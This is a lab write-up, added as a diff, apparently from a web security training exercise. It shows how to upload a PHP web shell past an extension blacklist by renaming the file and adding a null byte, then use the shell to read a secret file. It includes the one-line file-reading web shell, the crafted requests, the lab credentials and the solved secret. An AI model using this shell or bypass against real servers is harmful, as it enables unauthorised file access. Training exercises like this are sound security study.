@@ -1,0 +1,22 @@
+Lab #5 - Web shell upload via obfuscated file extension
+
+Vulnerability - This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.
+
+Goal - To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
+
+Credentials - wiener:peter
+
+Analysis:
+1. Log in with credentials wiener:peter
+2. Upload an avatar using image upload function.
+3. Upload a php web shell:
+<?php echo file_get_contents($_GET['filename']); ?>
+=> error: Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.
+4. In the Burp Repeater, append into filename .png (shell.php.png) , change Content-Type: image/png
+=> SUCCESSFULLY upload it to server
+=> make a GET request to this file:GET /files/avatars/shell.php.png?filename=/home/carlos/secret HTTP/2
+=> It is not executable => it is processed as text file.
+6. URL-encoded null byte characters before file extension: shell.php%00.png
+=> SUCCESSFULLY upload to server: The file avatars/shell.php has been uploaded.
+=> Make a GET request to this file: GET /files/avatars/shell.php?filename=/home/carlos/secret HTTP/2
+=> SUCCESSFULLY => secret number is GzXeTACFNculhKXeiSc5cFkEAN4IZzWj
